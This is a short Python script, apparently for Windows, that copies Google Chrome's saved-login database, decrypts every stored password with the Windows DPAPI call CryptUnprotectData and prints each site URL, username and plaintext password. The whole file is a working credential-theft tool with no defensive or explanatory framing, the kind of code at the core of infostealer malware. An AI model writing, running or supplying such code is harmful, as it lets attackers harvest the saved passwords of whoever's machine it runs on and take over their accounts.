from os import getenv 
import sqlite3        
import win32crypt     
from shutil import copyfile 

path = getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login Data"
path2 = getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login2"
copyfile(path, path2)

conn = sqlite3.connect(path2)
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')

for raw in cursor.fetchall():
    
    password = (win32crypt.CryptUnprotectData(raw[2])[1])
    if(password):
        print ('\n' + raw[0] + '\n' + "U: " + raw[1])
        print ("P: " + password.decode("utf-8"))

conn.close()
